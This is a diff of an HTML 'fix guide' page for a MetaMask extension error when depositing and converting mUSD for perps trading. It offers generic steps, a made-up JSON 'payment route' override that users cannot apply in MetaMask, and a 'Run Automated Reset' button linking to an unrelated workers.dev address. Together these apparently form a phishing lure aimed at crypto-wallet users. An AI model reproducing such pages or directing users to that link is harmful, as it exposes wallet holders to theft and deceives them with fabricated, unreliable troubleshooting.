@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,35 +39,40 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</h1>
+<h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension for Perps.</li>
+<li>The user encounters an error message stating "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension for perps trading on the Ethereum (ETH) ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary mismatch in the available payment routes configured in the Metamask extension, likely caused by updates or changes in the Ethereum (ETH) ecosystem.</li>
+<li>The error occurs due to a temporary mismatch in the available payment routes within the Metamask extension, preventing the conversion of mUSD.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Attempt to restart the Metamask extension and retry the transaction.</li>
+<li>Attempt to refresh the Metamask extension and retry the transaction.</li>
 <li>Check for any available updates for the Metamask extension and install the latest version.</li>
-<li>Utilize the following JSON configuration to manually override the payment route:</li>
+<li>Use the following JSON configuration to manually override the payment route:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;availableRoutes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;mUSD&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USDT&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">]</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoutes&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;source&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;destination&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;route&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD-ETH&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further troubleshooting.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ensure the latest version of the Metamask extension is installed.</li>
-<li>Verify that the Ethereum network is selected and properly configured.</li>
-<li>Confirm sufficient funds are available in the wallet for the transaction.</li>
+<li>Metamask extension installed and configured on the browser.</li>
+<li>Sufficient ETH for transaction fees.</li>
+<li>mUSD tokens available in the Metamask wallet.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
